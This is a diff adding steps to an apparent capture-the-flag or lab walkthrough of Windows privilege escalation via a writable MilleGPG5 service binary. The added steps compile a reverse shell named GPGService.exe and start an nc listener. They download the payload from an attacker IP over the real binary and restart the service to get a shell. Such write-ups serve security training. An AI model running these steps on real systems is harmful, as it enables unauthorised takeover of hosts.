@@ -116,3 +116,44 @@ C:\Program Files\MilleGPG5\GPGService.exe BUILTIN\Users:(R)
 #NOTE: Modify is available on GPGService.exe
 ```
 ![alt text](image-6.png)
+
+## Create Shell
+![alt text](image-7.png)
+
+```bash
+nano shell.c
+```
+
+## Compile shell with rename
+```bash
+x86_64-w64-mingw32-gcc shell.c -o GPGService.exe -lws2_32
+```
+
+## Stop the running service
+```bash
+net stop GPGOrchestrator
+```
+![alt text](image-8.png)
+
+## Start Listner
+```bash
+nc -nvlp 4444
+```
+
+## Transfer File
+```bash
+Invoke-WebRequest http://192.168.45.244/GPGService.exe -OutFile "C:\Program Files\MilleGPG5\GPGService.exe"
+
+#Success
+```
+
+## Start Service and Establish Shell
+
+```bash
+net start GPGOrchestrator
+
+# Check Listner
+# Shell Established
+# Grab Flag
+```
+![alt text](image-9.png)
